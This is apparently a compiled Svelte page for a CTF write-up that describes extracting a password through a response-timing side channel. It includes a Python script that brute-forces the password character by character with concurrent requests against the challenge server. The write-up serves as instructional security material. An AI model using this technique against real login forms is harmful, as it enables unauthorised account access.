import{S as ha,i as va,s as ua,W as Js,w as u,x as _,y as w,Z as _a,_ as ga,f as A,t as $,z as b,$ as Ea,k as t,q as r,a as i,T as wa,l as o,m as p,r as F,h as n,c as y,U as Aa,n as Gs,b as ys,D as s,E as $a}from"../../../chunks/index-9671d79c.js";import{P as ba}from"../../../chunks/post_layout-76c250d8.js";import{I as C}from"../../../chunks/post_card-ea1dea7e.js";function ka(U){let a,D,f,h,c,g,W,B,L,Ds,v,ds,Q,gs,Es,Z,ms,fs,hs,H,x,vs,N,us,_s,G,ws,As,J,$s,bs,K,S,ks,E,Is,M,Cs,Ls,V,xs,Ss,X,qs,Ts,Ps,Y,q,js,ss,T,Os,as,Rs,rs,es,fa=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" python="true"><div class="language-id">python</div><div class='code-container'><code><div class='line'><span style="color: #546E7A">#!/usr/bin/python3</span></div><div class='line'><span style="color: #89DDFF">from</span><span style="color: #EEFFFF"> requests_futures</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">sessions </span><span style="color: #89DDFF">import</span><span style="color: #EEFFFF"> FuturesSession</span></div><div class='line'><span style="color: #89DDFF">from</span><span style="color: #EEFFFF"> concurrent</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">futures </span><span style="color: #89DDFF">import</span><span style="color: #EEFFFF"> as_completed</span></div><div class='line'><span style="color: #89DDFF">import</span><span style="color: #EEFFFF"> string</span></div><div class='line'><span style="color: #89DDFF">from</span><span style="color: #EEFFFF"> requests </span><span style="color: #89DDFF">import</span><span style="color: #EEFFFF"> post</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">char_set </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> string</span><span style="color: #89DDFF">.</span><span style="color: #F07178">ascii_lowercase</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">+</span><span style="color: #EEFFFF"> string</span><span style="color: #89DDFF">.</span><span style="color: #F07178">ascii_uppercase</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">+</span><span style="color: #EEFFFF"> string</span><span style="color: #89DDFF">.</span><span style="color: #F07178">digits</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">+</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">_</span><span style="color: #89DDFF">'</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">+</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">&#123;</span><span style="color: #89DDFF">'</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">+</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">&#125;</span><span style="color: #89DDFF">'</span><span style="color: #EEFFFF">  </span></div><div class='line'><span style="color: #EEFFFF">url </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">http://139.59.46.128:2345/</span><span style="color: #89DDFF">"</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">flag </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">''</span></div><div class='line'><span style="color: #546E7A">#flag = 'enc0re&#123;5'</span></div><div class='line'></div><div class='line'><span style="color: #82AAFF">print</span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">[*]Getting the password.......</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">)</span></div><div class='line'><span style="color: #89DDFF">with</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">FuturesSession</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">max_workers</span><span style="color: #89DDFF">=</span><span style="color: #82AAFF">len</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">char_set</span><span style="color: #89DDFF">))</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">as</span><span style="color: #EEFFFF"> session</span><span style="color: #89DDFF">:</span></div><div class='line'><span style="color: #EEFFFF">    stat </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#123;&#125;</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">while</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">not</span><span style="color: #EEFFFF"> flag</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">endswith</span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">&#125;</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">):</span></div><div class='line'><span style="color: #EEFFFF">        threads </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">[</span></div><div class='line'><span style="color: #EEFFFF">                    session</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">post</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">url</span><span style="color: #89DDFF">,</span><span style="color: #82AAFF"> </span><span style="color: #EEFFFF">data</span><span style="color: #89DDFF">=&#123;</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">password</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">:</span><span style="color: #82AAFF"> </span><span style="color: #C792EA">f</span><span style="color: #C3E88D">"</span><span style="color: #82AAFF">&#123;flag </span><span style="color: #89DDFF">+</span><span style="color: #82AAFF"> char&#125;</span><span style="color: #C3E88D">"</span><span style="color: #89DDFF">&#125;)</span><span style="color: #EEFFFF"> </span></div><div class='line'><span style="color: #EEFFFF">                    </span><span style="color: #89DDFF">for</span><span style="color: #EEFFFF"> char </span><span style="color: #89DDFF">in</span><span style="color: #EEFFFF"> char_set</span></div><div class='line'><span style="color: #EEFFFF">                </span><span style="color: #89DDFF">]</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">        flag </span><span style="color: #89DDFF">+=</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">max</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">zip</span><span style="color: #89DDFF">((</span><span style="color: #82AAFF">thread</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">result</span><span style="color: #89DDFF">().</span><span style="color: #F07178">elapsed</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">total_seconds</span><span style="color: #89DDFF">()</span><span style="color: #82AAFF"> </span><span style="color: #89DDFF">for</span><span style="color: #82AAFF"> thread </span><span style="color: #89DDFF">in</span><span style="color: #82AAFF"> threads</span><span style="color: #89DDFF">),</span><span style="color: #82AAFF"> char_set</span><span style="color: #89DDFF">))[</span><span style="color: #F78C6C">1</span><span style="color: #89DDFF">]</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #82AAFF">print</span><span style="color: #89DDFF">(</span><span style="color: #C792EA">f</span><span style="color: #C3E88D">"[*]Password: </span><span style="color: #82AAFF">&#123;flag&#125;</span><span style="color: #C3E88D">"</span><span style="color: #89DDFF">)</span></div><div class='line'></div><div class='line'><span style="color: #82AAFF">print</span><span style="color: #89DDFF">(</span><span style="color: #C792EA">f</span><span style="color: #C3E88D">"[!]Password: </span><span style="color: #82AAFF">&#123;flag&#125;</span><span style="color: #C3E88D">"</span><span style="color: #89DDFF">)</span></div><div class='line'></div><div class='line'><span style="color: #82AAFF">print</span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">[*]Submitting the flag....</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">)</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">r </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">post</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">url</span><span style="color: #89DDFF">,</span><span style="color: #82AAFF"> </span><span style="color: #EEFFFF">data</span><span style="color: #89DDFF">=&#123;</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">password</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">:</span><span style="color: #C792EA">f</span><span style="color: #C3E88D">"</span><span style="color: #82AAFF">&#123;flag&#125;</span><span style="color: #C3E88D">"</span><span style="color: #89DDFF">&#125;)</span></div><div class='line'></div><div class='line'><span style="color: #82AAFF">print</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">r</span><span style="color: #89DDFF">.</span><span style="color: #F07178">text</span><span style="color: #89DDFF">)</span></div><div class='line'></div></code></div></pre>`,ls,d,P,Us,k,Ws,zs,Bs,ns,j,Qs,ts,O,Zs,os,Hs,Ns,ps,R,Fs;return L=new C({props:{src:"https://gitlab.com/Aviksaikat/write-ups/-/raw/main/challenges/chal2/images/1.png"}}),x=new C({props:{src:"https://gitlab.com/Aviksaikat/write-ups/-/raw/main/challenges/chal2/images/2.png"}}),S=new C({props:{src:"https://gitlab.com/Aviksaikat/write-ups/-/raw/main/challenges/chal2/images/3.png"}}),q=new C({props:{src:"https://gitlab.com/Aviksaikat/write-ups/-/raw/main/challenges/chal2/images/4.png"}}),T=new C({props:{src:"https://gitlab.com/Aviksaikat/write-ups/-/raw/main/challenges/chal2/images/8.png"}}),j=new C({props:{src:"https://gitlab.com/Aviksaikat/write-ups/-/raw/main/challenges/chal2/images/5.png"}}),O=new C({props:{src:"https://gitlab.com/Aviksaikat/write-ups/-/raw/main/challenges/chal2/images/7.png"}}),R=new C({props:{src:"https://gitlab.com/Aviksaikat/write-ups/-/raw/main/challenges/chal2/images/6.png"}}),{c(){a=t("ul"),D=t("li"),f=r("So in this challenge we have only an address "),h=t("code"),c=r("http://139.59.46.128:2345/"),g=r(" & there is a field to submit password."),W=i(),B=t("li"),u(L.$$.fragment),Ds=i(),v=t("li"),ds=r("If we try to enter something we obviously get an error "),Q=t("code"),gs=r("Incorrect Password"),Es=r(".Look at the developer console we can see the form is sending a post request with a post parameter "),Z=t("code"),ms=r("password"),fs=r("."),hs=i(),H=t("li"),u(x.$$.fragment),vs=i(),N=t("li"),us=r("We can try sql injection payload and also test for xss & all but noting."),_s=i(),G=t("li"),ws=r("At this point I had no idea about what to do. I tried bruteforcing passwords(using worldlists). Nothing happened."),As=i(),J=t("li"),$s=r("I tried sending one character at a time using burp and"),bs=i(),K=t("li"),u(S.$$.fragment),ks=i(),E=t("li"),Is=r("If we enable "),M=t("code"),Cs=r("Response received"),Ls=r(" we can see "),V=t("code"),xs=r("e"),Ss=r(" took the longest time to give a response & it’s not random if we run this multiple time we can still see "),X=t("code"),qs=r("e"),Ts=r(" took the longest to give back a response"),Ps=i(),Y=t("li"),u(q.$$.fragment),js=i(),ss=t("li"),u(T.$$.fragment),Os=i(),as=t("li"),Rs=r("We can attack one character at a time. But it’ll take a great effort to do this manually with burp so I made a script"),rs=i(),es=new wa(!1),ls=i(),d=t("ul"),P=t("li"),Us=r("The concept is simple we’re bruteforcing one character at a time and looking for the one which takes the longest to give a response back & adding it to the flag variable(string) & we’re using multiprocessing("),k=t("a"),Ws=r("future library"),zs=r(")"),Bs=i(),ns=t("li"),u(j.$$.fragment),Qs=i(),ts=t("li"),u(O.$$.fragment),Zs=i(),os=t("li"),Hs=r("Running the script we got the flag"),Ns=i(),ps=t("li"),u(R.$$.fragment),this.h()},l(e){a=o(e,"UL",{});var l=p(a);D=o(l,"LI",{});var cs=p(D);f=F(cs,"So in this challenge we have only an address "),h=o(cs,"CODE",{});var Ks=p(h);c=F(Ks,"http://139.59.46.128:2345/"),Ks.forEach(n),g=F(cs," & there is a field to submit password."),cs.forEach(n),W=y(l),B=o(l,"LI",{});var Ms=p(B);_(L.$$.fragment,Ms),Ms.forEach(n),Ds=y(l),v=o(l,"LI",{});var z=p(v);ds=F(z,"If we try to enter something we obviously get an error "),Q=o(z,"CODE",{});var Vs=p(Q);gs=F(Vs,"Incorrect Password"),Vs.forEach(n),Es=F(z,".Look at the developer console we can see the form is sending a post request with a post parameter "),Z=o(z,"CODE",{});var Xs=p(Z);ms=F(Xs,"password"),Xs.forEach(n),fs=F(z,"."),z.forEach(n),hs=y(l),H=o(l,"LI",{});var Ys=p(H);_(x.$$.fragment,Ys),Ys.forEach(n),vs=y(l),N=o(l,"LI",{});var sa=p(N);us=F(sa,"We can try sql injection payload and also test for xss & all but noting."),sa.forEach(n),_s=y(l),G=o(l,"LI",{});var aa=p(G);ws=F(aa,"At this point I had no idea about what to do. I tried bruteforcing passwords(using worldlists). Nothing happened."),aa.forEach(n),As=y(l),J=o(l,"LI",{});var ea=p(J);$s=F(ea,"I tried sending one character at a time using burp and"),ea.forEach(n),bs=y(l),K=o(l,"LI",{});var la=p(K);_(S.$$.fragment,la),la.forEach(n),ks=y(l),E=o(l,"LI",{});var I=p(E);Is=F(I,"If we enable "),M=o(I,"CODE",{});var na=p(M);Cs=F(na,"Response received"),na.forEach(n),Ls=F(I," we can see "),V=o(I,"CODE",{});var ta=p(V);xs=F(ta,"e"),ta.forEach(n),Ss=F(I," took the longest time to give a response & it’s not random if we run this multiple time we can still see "),X=o(I,"CODE",{});var oa=p(X);qs=F(oa,"e"),oa.forEach(n),Ts=F(I," took the longest to give back a response"),I.forEach(n),Ps=y(l),Y=o(l,"LI",{});var pa=p(Y);_(q.$$.fragment,pa),pa.forEach(n),js=y(l),ss=o(l,"LI",{});var ra=p(ss);_(T.$$.fragment,ra),ra.forEach(n),Os=y(l),as=o(l,"LI",{});var Fa=p(as);Rs=F(Fa,"We can attack one character at a time. But it’ll take a great effort to do this manually with burp so I made a script"),Fa.forEach(n),l.forEach(n),rs=y(e),es=Aa(e,!1),ls=y(e),d=o(e,"UL",{});var m=p(d);P=o(m,"LI",{});var is=p(P);Us=F(is,"The concept is simple we’re bruteforcing one character at a time and looking for the one which takes the longest to give a response back & adding it to the flag variable(string) & we’re using multiprocessing("),k=o(is,"A",{href:!0,rel:!0,target:!0});var ca=p(k);Ws=F(ca,"future library"),ca.forEach(n),zs=F(is,")"),is.forEach(n),Bs=y(m),ns=o(m,"LI",{});var ia=p(ns);_(j.$$.fragment,ia),ia.forEach(n),Qs=y(m),ts=o(m,"LI",{});var ya=p(ts);_(O.$$.fragment,ya),ya.forEach(n),Zs=y(m),os=o(m,"LI",{});var Da=p(os);Hs=F(Da,"Running the script we got the flag"),Da.forEach(n),Ns=y(m),ps=o(m,"LI",{});var da=p(ps);_(R.$$.fragment,da),da.forEach(n),m.forEach(n),this.h()},h(){es.a=ls,Gs(k,"href","https://pythonrepo.com/repo/ross-requests-futures-python-working-with-http"),Gs(k,"rel","nofollow noopener noreferrer external"),Gs(k,"target","_blank")},m(e,l){ys(e,a,l),s(a,D),s(D,f),s(D,h),s(h,c),s(D,g),s(a,W),s(a,B),w(L,B,null),s(a,Ds),s(a,v),s(v,ds),s(v,Q),s(Q,gs),s(v,Es),s(v,Z),s(Z,ms),s(v,fs),s(a,hs),s(a,H),w(x,H,null),s(a,vs),s(a,N),s(N,us),s(a,_s),s(a,G),s(G,ws),s(a,As),s(a,J),s(J,$s),s(a,bs),s(a,K),w(S,K,null),s(a,ks),s(a,E),s(E,Is),s(E,M),s(M,Cs),s(E,Ls),s(E,V),s(V,xs),s(E,Ss),s(E,X),s(X,qs),s(E,Ts),s(a,Ps),s(a,Y),w(q,Y,null),s(a,js),s(a,ss),w(T,ss,null),s(a,Os),s(a,as),s(as,Rs),ys(e,rs,l),es.m(fa,e,l),ys(e,ls,l),ys(e,d,l),s(d,P),s(P,Us),s(P,k),s(k,Ws),s(P,zs),s(d,Bs),s(d,ns),w(j,ns,null),s(d,Qs),s(d,ts),w(O,ts,null),s(d,Zs),s(d,os),s(os,Hs),s(d,Ns),s(d,ps),w(R,ps,null),Fs=!0},p:$a,i(e){Fs||(A(L.$$.fragment,e),A(x.$$.fragment,e),A(S.$$.fragment,e),A(q.$$.fragment,e),A(T.$$.fragment,e),A(j.$$.fragment,e),A(O.$$.fragment,e),A(R.$$.fragment,e),Fs=!0)},o(e){$(L.$$.fragment,e),$(x.$$.fragment,e),$(S.$$.fragment,e),$(q.$$.fragment,e),$(T.$$.fragment,e),$(j.$$.fragment,e),$(O.$$.fragment,e),$(R.$$.fragment,e),Fs=!1},d(e){e&&n(a),b(L),b(x),b(S),b(q),b(T),e&&n(rs),e&&es.d(),e&&n(ls),e&&n(d),b(j),b(O),b(R)}}}function Ia(U){let a,D;const f=[U[0],ma];let h={$$slots:{default:[ka]},$$scope:{ctx:U}};for(let c=0;c<f.length;c+=1)h=Js(h,f[c]);return a=new ba({props:h}),{c(){u(a.$$.fragment)},l(c){_(a.$$.fragment,c)},m(c,g){w(a,c,g),D=!0},p(c,[g]){const W=g&1?_a(f,[g&1&&ga(c[0]),g&0&&ga(ma)]):{};g&2&&(W.$$scope={dirty:g,ctx:c}),a.$set(W)},i(c){D||(A(a.$$.fragment,c),D=!0)},o(c){$(a.$$.fragment,c),D=!1},d(c){b(a,c)}}}const ma={title:"SQL Injection By Reponse Size",created:"2021-09-03T00:00:00.000Z",tags:["ctf","sqli","web"],flags:[],updated:"2023-01-13T20:03:17.945Z",slug:"/SQL Injection Using Threading/+page.svelte.md",path:"/SQL Injection Using Threading",toc:!1};function Ca(U,a,D){return U.$$set=f=>{D(0,a=Js(Js({},a),Ea(f)))},a=Ea(a),[a]}class qa extends ha{constructor(a){super(),va(this,a,Ca,Ia,ua,{})}}export{qa as default,ma as metadata};
